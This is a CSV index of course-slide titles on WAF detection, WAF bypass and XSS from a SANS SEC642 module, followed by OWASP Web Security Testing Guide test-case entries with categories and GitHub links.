S642-5.1.3.725,SEC642,5. Distributed WAFs,,,,,,,,5.1.3: Web Application Firewalls,725,,,true,,,sec642/43380/index.htm#5,,,,
S642-5.1.3.727,SEC642,7. ModSecurity,,,,,,,,5.1.3: Web Application Firewalls,727,,,true,,,sec642/43380/index.htm#7,,,,
S642-5.1.3.734,SEC642,14. Anatomy of a Rule,,,,,,,,5.1.3: Web Application Firewalls,734,,,true,,,sec642/43380/index.htm#14,,,,
S642-5.1.3.738,SEC642,18. Course Roadmap,,,,,,,,5.1.3: Web Application Firewalls,738,,,,,,sec642/43380/index.htm#18,,,,
S642-5.1.3.739,SEC642,19. Exercise: ModSecurity,,,,,,,,5.1.3: Web Application Firewalls,739,,,,,,sec642/43380/index.htm#19,,,,
S642-5.1.3.740,SEC642,20. Answers Ahead!,,,,,,,,5.1.3: Web Application Firewalls,740,,,,,,sec642/43380/index.htm#20,,,,
S642-5.1.3.741,SEC642,21. Exercise: ModSecurity Which Rules are enabled/disabled?,,,,,,,,5.1.3: Web Application Firewalls,741,,,,,,sec642/43380/index.htm#21,,,,
S642-5.1.3.742,SEC642,22. Exercise: ModSecurity Are the Tight Security Rules Running?,,,,,,,,5.1.3: Web Application Firewalls,742,,,,,,sec642/43380/index.htm#22,,,,
S642-5.1.3.743,SEC642,23. Exercise: ModSecurity Why is the String,,,,,,,,5.1.3: Web Application Firewalls,743,,,,,,sec642/43380/index.htm#23,,,,
S642-5.1.3.736,SEC642,16. Detecting & Blocking,,,,,,,,5.1.3: Web Application Firewalls,736,,,true,,,sec642/43380/index.htm#16,,,,
S642-5.1.3.745,SEC642,25. Exercise: ModSecurity Triggering Protocol Anomalies,,,,,,,,5.1.3: Web Application Firewalls,745,,,,,,sec642/43380/index.htm#25,,,,
S642-5.1.3.746,SEC642,26. Review: ModSec Exercise,,,,,,,,5.1.3: Web Application Firewalls,746,,,,,,sec642/43380/index.htm#26,,,,
S642-5.1.4.747,SEC642,5.1.4: Bypassing Controls,,,,,,,,5.1.4: Bypassing Controls,747,,,true,,,sec642/43385/index.htm,,,,
S642-5.1.3.735,SEC642,15. SSN Detection,,,,,,,,5.1.3: Web Application Firewalls,735,,,true,,,sec642/43380/index.htm#15,,,,
S642-5.1.3.737,SEC642,17. Implementing a Rule,,,,,,,,5.1.3: Web Application Firewalls,737,,,true,,,sec642/43380/index.htm#17,,,,
S642-5.1.4.750,SEC642,4. Discovering the Controls,,,,,,,,5.1.4: Bypassing Controls,750,,,true,,,sec642/43385/index.htm#4,,,,
S642-5.1.4.751,SEC642,5. Fingerprinting Controls,,,,,,,,5.1.4: Bypassing Controls,751,,,true,,,sec642/43385/index.htm#5,,,,
S642-5.1.4.752,SEC642,6. Response Code-based Fingerprinting,,,,,,,,5.1.4: Bypassing Controls,752,,,true,,,sec642/43385/index.htm#6,,,,
S642-5.1.4.753,SEC642,7. Error-based Fingerprinting,,,,,,,,5.1.4: Bypassing Controls,753,,,true,,,sec642/43385/index.htm#7,,,,
S642-5.1.4.748,SEC642,2. Bypassing Controls,,,,,,,,5.1.4: Bypassing Controls,748,,,true,,,sec642/43385/index.htm#2,,,,
S642-5.1.3.744,SEC642,24. Exercise: ModSecurity Triggering Bad Robots,,,Search engine indexing,,1,,,5.1.3: Web Application Firewalls,744,,,false,,,sec642/43380/index.htm#24,612,,,
S642-5.1.4.756,SEC642,10. ASCII,,,,,,,,5.1.4: Bypassing Controls,756,,,true,,,sec642/43385/index.htm#10,,,,
S642-5.1.4.757,SEC642,11. UTF-8,,,,,,,,5.1.4: Bypassing Controls,757,,,true,,,sec642/43385/index.htm#11,,,,
S642-5.1.4.758,SEC642,12. UNICODE,,,,,,,,5.1.4: Bypassing Controls,758,,,true,,,sec642/43385/index.htm#12,,,,
S642-5.1.4.759,SEC642,13. UNICODE Mapping,,,,,,,,5.1.4: Bypassing Controls,759,,,true,,,sec642/43385/index.htm#13,,,,
S642-5.1.4.760,SEC642,14. Course Roadmap,,,,,,,,5.1.4: Bypassing Controls,760,,,,,,sec642/43385/index.htm#14,,,,
S642-5.1.4.761,SEC642,15. Exercise: Fingerprinting Controls,,,,,,,,5.1.4: Bypassing Controls,761,,,,,,sec642/43385/index.htm#15,,,,
S642-5.1.4.762,SEC642,16. Answers Ahead!,,,,,,,,5.1.4: Bypassing Controls,762,,,,,,sec642/43385/index.htm#16,,,,
S642-5.1.4.763,SEC642,17. Fingerprinting Exercise: Fuzz the Applications,,,,,,,,5.1.4: Bypassing Controls,763,,,,,,sec642/43385/index.htm#17,,,,
S642-5.1.4.764,SEC642,18. Review: Fingerprinting Controls,,,,,,,,5.1.4: Bypassing Controls,764,,,,,,sec642/43385/index.htm#18,,,,
S642-5.1.4.765,SEC642,19. Course Roadmap,,,,,,,,5.1.4: Bypassing Controls,765,,,,,,sec642/43385/index.htm#19,,,,
S642-5.1.4.766,SEC642,20. Automated WAF Detection Tools,,,,,,,,5.1.4: Bypassing Controls,766,,,true,,,sec642/43385/index.htm#20,,,,
S642-5.1.4.767,SEC642,21. Nmap NSE Script,,,,,,,,5.1.4: Bypassing Controls,767,,,true,,,sec642/43385/index.htm#21,,,,
S642-5.1.4.768,SEC642,22. Automated Scanners,,,,,,,,5.1.4: Bypassing Controls,768,,,true,,,sec642/43385/index.htm#22,,,,
S642-5.1.4.755,SEC642,9. Character Sets,,,,,,,,5.1.4: Bypassing Controls,755,,,true,,,sec642/43385/index.htm#9,,,,
S642-5.1.4.754,SEC642,8. Fuzzing,,,,,,,,5.1.4: Bypassing Controls,754,,,true,,,sec642/43385/index.htm#8,,,,
S642-5.1.4.770,SEC642,24. Course Roadmap,,,,,,,,5.1.4: Bypassing Controls,770,,,,,,sec642/43385/index.htm#24,,,,
S642-5.1.4.771,SEC642,25. Exercise: Automated WAF Detection,,,,,,,,5.1.4: Bypassing Controls,771,,,,,,sec642/43385/index.htm#25,,,,
S642-5.1.4.772,SEC642,26. Answers Ahead!,,,,,,,,5.1.4: Bypassing Controls,772,,,,,,sec642/43385/index.htm#26,,,,
S642-5.1.4.749,SEC642,3. Bypass Based on Protection,,,,,,,,5.1.4: Bypassing Controls,749,,,true,,,sec642/43385/index.htm#3,,,,
S642-5.1.4.775,SEC642,29. Automated WAF Detection Exercise: Run wafw00f,,,,,,,,5.1.4: Bypassing Controls,775,,,,,,sec642/43385/index.htm#29,,,,
S642-5.1.5.776,SEC642,30. Review: Automated Fingerprinting Tools,,,,,,,,5.1.4: Bypassing Controls,776,,,,,,sec642/43385/index.htm#30,,,,
S642-5.1.5.777,SEC642,5.1.5: Cross-Site Scripting,,,,,,,,5.1.5: Cross-Site Scripting,777,,,false,,,sec642/43390/index.htm,,,,
S642-5.1.5.778,SEC642,2. XSS is Client-focused,,,,,,,,5.1.5: Cross-Site Scripting,778,,,false,,,sec642/43390/index.htm#2,,,,
S642-5.1.5.779,SEC642,3. Abuse the Misunderstandings,,,,,,,,5.1.5: Cross-Site Scripting,779,,,false,,,sec642/43390/index.htm#3,,,,
S642-5.1.4.773,SEC642,27. Automated WAF Detection Exercise: Run NMAP and NSE Scripts,,,,,,,,5.1.4: Bypassing Controls,773,,,,,,sec642/43385/index.htm#27,,,,
WSTG-01.01,OWASP-WSTG,Conduct Search Engine Discovery Reconnaissance for Information Leakage,Information_Gathering,Conduct Search Engine Discovery Reconnaissance for Information Leakage,Conduct Search Engine Discovery Reconnaissance for Information Leakage issue,Conduct Search Engine Discovery Reconnaissance for Information Leakage,2,Click TTRef link.,Discovery,Information_Gathering,01.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage.md,,false,false,false
WSTG-01.02,OWASP-WSTG,Fingerprint Web Server,Information_Gathering,Fingerprint Web Server,Fingerprint Web Server issue,Fingerprint Web Server,2,Click TTRef link.,Discovery,Information_Gathering,01.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server.md,,false,false,false
WSTG-01.03,OWASP-WSTG,Review Webserver Metafiles for Information Leakage,Information_Gathering,Review Webserver Metafiles for Information Leakage,Review Webserver Metafiles for Information Leakage issue,Review Webserver Metafiles for Information Leakage,2,Click TTRef link.,Discovery,Information_Gathering,01.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/03-Review_Webserver_Metafiles_for_Information_Leakage.md,,false,false,false
WSTG-01.04,OWASP-WSTG,Enumerate Applications on Webserver,Information_Gathering,Enumerate Applications on Webserver,Enumerate Applications on Webserver issue,Enumerate Applications on Webserver,2,Click TTRef link.,Discovery,Information_Gathering,01.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver.md,,false,false,false
WSTG-01.05,OWASP-WSTG,Review Webpage Content for Information Leakage,Information_Gathering,Review Webpage Content for Information Leakage,Review Webpage Content for Information Leakage issue,Review Webpage Content for Information Leakage,2,Click TTRef link.,Discovery,Information_Gathering,01.05,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage.md,,false,false,false
WSTG-01.06,OWASP-WSTG,Identify Application Entry Points,Information_Gathering,Identify Application Entry Points,Identify Application Entry Points issue,Identify Application Entry Points,2,Click TTRef link.,Discovery,Information_Gathering,01.06,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points.md,,false,false,false
WSTG-01.07,OWASP-WSTG,Map Execution Paths Through Application,Information_Gathering,Map Execution Paths Through Application,Map Execution Paths Through Application issue,Map Execution Paths Through Application,2,Click TTRef link.,Discovery,Information_Gathering,01.07,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/07-Map_Execution_Paths_Through_Application.md,,false,false,false
WSTG-01.08,OWASP-WSTG,Fingerprint Web Application Framework,Information_Gathering,Fingerprint Web Application Framework,Fingerprint Web Application Framework issue,Fingerprint Web Application Framework,2,Click TTRef link.,Discovery,Information_Gathering,01.08,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.md,,false,false,false
WSTG-01.09,OWASP-WSTG,Fingerprint Web Application,Information_Gathering,Fingerprint Web Application,Fingerprint Web Application issue,Fingerprint Web Application,2,Click TTRef link.,Discovery,Information_Gathering,01.09,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/09-Fingerprint_Web_Application.md,,false,false,false
WSTG-01.10,OWASP-WSTG,Map Application Architecture,Information_Gathering,Map Application Architecture,Map Application Architecture issue,Map Application Architecture,2,Click TTRef link.,Discovery,Information_Gathering,01.10,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/01-Information_Gathering/10-Map_Application_Architecture.md,,false,false,false
WSTG-02.01,OWASP-WSTG,Test Network Infrastructure Configuration,Configuration_and_Deployment_Management_Testing,Test Network Infrastructure Configuration,Test Network Infrastructure Configuration issue,Test Network Infrastructure Configuration,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/01-Test_Network_Infrastructure_Configuration.md,,false,false,false
WSTG-02.02,OWASP-WSTG,Test Application Platform Configuration,Configuration_and_Deployment_Management_Testing,Test Application Platform Configuration,Test Application Platform Configuration issue,Test Application Platform Configuration,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/02-Test_Application_Platform_Configuration.md,,false,false,false
WSTG-02.03,OWASP-WSTG,Test File Extensions Handling for Sensitive Information,Configuration_and_Deployment_Management_Testing,Test File Extensions Handling for Sensitive Information,Test File Extensions Handling for Sensitive Information issue,Test File Extensions Handling for Sensitive Information,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information.md,,false,false,false
WSTG-02.04,OWASP-WSTG,Review Old Backup and Unreferenced Files for Sensitive Information,Configuration_and_Deployment_Management_Testing,Review Old Backup and Unreferenced Files for Sensitive Information,Review Old Backup and Unreferenced Files for Sensitive Information issue,Review Old Backup and Unreferenced Files for Sensitive Information,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information.md,,false,false,false
WSTG-02.05,OWASP-WSTG,Enumerate Infrastructure and Application Admin Interfaces,Configuration_and_Deployment_Management_Testing,Enumerate Infrastructure and Application Admin Interfaces,Enumerate Infrastructure and Application Admin Interfaces issue,Enumerate Infrastructure and Application Admin Interfaces,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.05,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces.md,,false,false,false
WSTG-02.06,OWASP-WSTG,Test HTTP Methods,Configuration_and_Deployment_Management_Testing,Test HTTP Methods,Test HTTP Methods issue,Test HTTP Methods,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.06,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods.md,,false,false,false
WSTG-02.07,OWASP-WSTG,Test HTTP Strict Transport Security,Configuration_and_Deployment_Management_Testing,Test HTTP Strict Transport Security,Test HTTP Strict Transport Security issue,Test HTTP Strict Transport Security,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.07,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security.md,,false,false,false
WSTG-02.08,OWASP-WSTG,Test RIA Cross Domain Policy,Configuration_and_Deployment_Management_Testing,Test RIA Cross Domain Policy,Test RIA Cross Domain Policy issue,Test RIA Cross Domain Policy,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.08,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/08-Test_RIA_Cross_Domain_Policy.md,,false,false,false
WSTG-02.09,OWASP-WSTG,Test File Permission,Configuration_and_Deployment_Management_Testing,Test File Permission,Test File Permission issue,Test File Permission,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.09,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission.md,,false,false,false
WSTG-02.10,OWASP-WSTG,Test for Subdomain Takeover,Configuration_and_Deployment_Management_Testing,Test for Subdomain Takeover,Test for Subdomain Takeover issue,Test for Subdomain Takeover,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.10,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover.md,,false,false,false
WSTG-02.11,OWASP-WSTG,Test Cloud Storage,Configuration_and_Deployment_Management_Testing,Test Cloud Storage,Test Cloud Storage issue,Test Cloud Storage,2,Click TTRef link.,Discovery,Configuration_and_Deployment_Management_Testing,02.11,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md,,false,false,false
WSTG-03.01,OWASP-WSTG,Test Role Definitions,Identity_Management_Testing,Test Role Definitions,Test Role Definitions issue,Test Role Definitions,2,Click TTRef link.,Discovery,Identity_Management_Testing,03.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/01-Test_Role_Definitions.md,,false,false,false
WSTG-03.02,OWASP-WSTG,Test User Registration Process,Identity_Management_Testing,Test User Registration Process,Test User Registration Process issue,Test User Registration Process,2,Click TTRef link.,Discovery,Identity_Management_Testing,03.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Test_User_Registration_Process.md,,false,false,false
WSTG-03.03,OWASP-WSTG,Test Account Provisioning Process,Identity_Management_Testing,Test Account Provisioning Process,Test Account Provisioning Process issue,Test Account Provisioning Process,2,Click TTRef link.,Discovery,Identity_Management_Testing,03.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/03-Test_Account_Provisioning_Process.md,,false,false,false
WSTG-03.04,OWASP-WSTG,Testing for Account Enumeration and Guessable User Account,Identity_Management_Testing,Account Enumeration and Guessable User Account,Account Enumeration and Guessable User Account issue,Account Enumeration and Guessable User Account,2,Click TTRef link.,Discovery,Identity_Management_Testing,03.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md,,false,false,false
WSTG-03.05,OWASP-WSTG,Testing for Weak or Unenforced Username Policy,Identity_Management_Testing,Weak or Unenforced Username Policy,Weak or Unenforced Username Policy issue,Weak or Unenforced Username Policy,2,Click TTRef link.,Discovery,Identity_Management_Testing,03.05,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy.md,,false,false,false
WSTG-04.02,OWASP-WSTG,Testing for Default Credentials,Authentication_Testing,Default Credentials,Default Credentials issue,Default Credentials,2,Click TTRef link.,Discovery,Authentication_Testing,04.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials.md,,false,false,false
WSTG-04.05,OWASP-WSTG,Testing for Vulnerable Remember Password,Authentication_Testing,Vulnerable Remember Password,Vulnerable Remember Password issue,Vulnerable Remember Password,2,Click TTRef link.,Discovery,Authentication_Testing,04.05,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password.md,,false,false,false
WSTG-04.06,OWASP-WSTG,Testing for Browser Cache Weaknesses,Authentication_Testing,Browser Cache Weaknesses,Browser Cache Weaknesses issue,Browser Cache Weaknesses,2,Click TTRef link.,Discovery,Authentication_Testing,04.06,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses.md,,false,false,false
WSTG-04.07,OWASP-WSTG,Testing for Weak Password Policy,Authentication_Testing,Weak Password Policy,Weak Password Policy issue,Weak Password Policy,2,Click TTRef link.,Discovery,Authentication_Testing,04.07,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy.md,,false,false,false
WSTG-04.01,OWASP-WSTG,Testing for Credentials Transported over an Encrypted Channel,Authentication_Testing,Credentials Transported over an Encrypted Channel,Credentials Transported over an Encrypted Channel issue,Credentials Transported over an Encrypted Channel,2,Click TTRef link.,Discovery,Authentication_Testing,04.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel.md,,false,false,false
WSTG-04.04,OWASP-WSTG,Testing for Bypassing Authentication Schema,Authentication_Testing,Bypassing Authentication Schema,Bypassing Authentication Schema issue,Bypassing Authentication Schema,2,Click TTRef link.,Discovery,Authentication_Testing,04.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema.md,,false,false,false
WSTG-04.03,OWASP-WSTG,Testing for Weak Lock Out Mechanism,Authentication_Testing,Weak Lock Out Mechanism,Weak Lock Out Mechanism issue,Weak Lock Out Mechanism,2,Click TTRef link.,Discovery,Authentication_Testing,04.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism.md,,false,false,false
WSTG-04.08,OWASP-WSTG,Testing for Weak Security Question Answer,Authentication_Testing,Weak Security Question Answer,Weak Security Question Answer issue,Weak Security Question Answer,2,Click TTRef link.,Discovery,Authentication_Testing,04.08,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer.md,,false,false,false
WSTG-04.09,OWASP-WSTG,Testing for Weak Password Change or Reset Functionalities,Authentication_Testing,Weak Password Change or Reset Functionalities,Weak Password Change or Reset Functionalities issue,Weak Password Change or Reset Functionalities,2,Click TTRef link.,Discovery,Authentication_Testing,04.09,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.md,,false,false,false
WSTG-04.10,OWASP-WSTG,Testing for Weaker Authentication in Alternative Channel,Authentication_Testing,Weaker Authentication in Alternative Channel,Weaker Authentication in Alternative Channel issue,Weaker Authentication in Alternative Channel,2,Click TTRef link.,Discovery,Authentication_Testing,04.10,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel.md,,false,false,false
WSTG-05.01,OWASP-WSTG,Testing Directory Traversal File Include,Authorization_Testing,Testing Directory Traversal File Include,Testing Directory Traversal File Include issue,Testing Directory Traversal File Include,2,Click TTRef link.,Discovery,Authorization_Testing,05.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md,,false,false,false
WSTG-05.02,OWASP-WSTG,Testing for Bypassing Authorization Schema,Authorization_Testing,Bypassing Authorization Schema,Bypassing Authorization Schema issue,Bypassing Authorization Schema,2,Click TTRef link.,Discovery,Authorization_Testing,05.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md,,false,false,false
WSTG-05.04,OWASP-WSTG,Testing for Insecure Direct Object References,Authorization_Testing,Insecure Direct Object References,Insecure Direct Object References issue,Insecure Direct Object References,2,Click TTRef link.,Discovery,Authorization_Testing,05.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md,,false,false,false
WSTG-05.03,OWASP-WSTG,Testing for Privilege Escalation,Authorization_Testing,Privilege Escalation,Privilege Escalation issue,Privilege Escalation,2,Click TTRef link.,Discovery,Authorization_Testing,05.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md,,false,false,false
WSTG-06.01,OWASP-WSTG,Testing for Session Management Schema,Session_Management_Testing,Session Management Schema,Session Management Schema issue,Session Management Schema,2,Click TTRef link.,Discovery,Session_Management_Testing,06.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema.md,,false,false,false
WSTG-06.02,OWASP-WSTG,Testing for Cookies Attributes,Session_Management_Testing,Cookies Attributes,Cookies Attributes issue,Cookies Attributes,2,Click TTRef link.,Discovery,Session_Management_Testing,06.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.md,,false,false,false
WSTG-06.03,OWASP-WSTG,Testing for Session Fixation,Session_Management_Testing,Session Fixation,Session Fixation issue,Session Fixation,2,Click TTRef link.,Discovery,Session_Management_Testing,06.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation.md,,false,false,false
WSTG-06.04,OWASP-WSTG,Testing for Exposed Session Variables,Session_Management_Testing,Exposed Session Variables,Exposed Session Variables issue,Exposed Session Variables,2,Click TTRef link.,Discovery,Session_Management_Testing,06.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables.md,,false,false,false
WSTG-06.05,OWASP-WSTG,Testing for Cross Site Request Forgery,Session_Management_Testing,Cross Site Request Forgery,Cross Site Request Forgery issue,Cross Site Request Forgery,2,Click TTRef link.,Discovery,Session_Management_Testing,06.05,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md,,false,false,false
WSTG-06.06,OWASP-WSTG,Testing for Logout Functionality,Session_Management_Testing,Logout Functionality,Logout Functionality issue,Logout Functionality,2,Click TTRef link.,Discovery,Session_Management_Testing,06.06,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality.md,,false,false,false
WSTG-07.01,OWASP-WSTG,Testing for Reflected Cross Site Scripting,Input_Validation_Testing,Reflected Cross Site Scripting,Reflected Cross Site Scripting issue,Reflected Cross Site Scripting,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.01,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md,,false,false,false
WSTG-07.02,OWASP-WSTG,Testing for Stored Cross Site Scripting,Input_Validation_Testing,Stored Cross Site Scripting,Stored Cross Site Scripting issue,Stored Cross Site Scripting,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.02,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.md,,false,false,false
WSTG-06.07,OWASP-WSTG,Testing Session Timeout,Session_Management_Testing,Testing Session Timeout,Testing Session Timeout issue,Testing Session Timeout,2,Click TTRef link.,Discovery,Session_Management_Testing,06.07,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout.md,,false,false,false
WSTG-06.08,OWASP-WSTG,Testing for Session Puzzling,Session_Management_Testing,Session Puzzling,Session Puzzling issue,Session Puzzling,2,Click TTRef link.,Discovery,Session_Management_Testing,06.08,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling.md,,false,false,false
WSTG-07.03,OWASP-WSTG,Testing for HTTP Verb Tampering,Input_Validation_Testing,HTTP Verb Tampering,HTTP Verb Tampering issue,HTTP Verb Tampering,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.03,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering.md,,false,false,false
WSTG-07.04,OWASP-WSTG,Testing for HTTP Parameter Pollution,Input_Validation_Testing,HTTP Parameter Pollution,HTTP Parameter Pollution issue,HTTP Parameter Pollution,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.04,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.md,,false,false,false
WSTG-07.05.1,OWASP-WSTG,Testing for Oracle,Input_Validation_Testing,Oracle,Oracle issue,Oracle,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.05.1,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle.md,,false,false,false
WSTG-07.05,OWASP-WSTG,Testing for SQL Injection,Input_Validation_Testing,SQL Injection,SQL Injection issue,SQL Injection,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.05,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md,,false,false,false
WSTG-07.05.2,OWASP-WSTG,Testing for MySQL,Input_Validation_Testing,MySQL,MySQL issue,MySQL,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.05.2,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL.md,,false,false,false
WSTG-07.05.4,OWASP-WSTG,Testing PostgreSQL,Input_Validation_Testing,Testing PostgreSQL,Testing PostgreSQL issue,Testing PostgreSQL,2,Click TTRef link.,Discovery,Input_Validation_Testing,07.05.4,,,false,,,https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL.md,,false,false,false
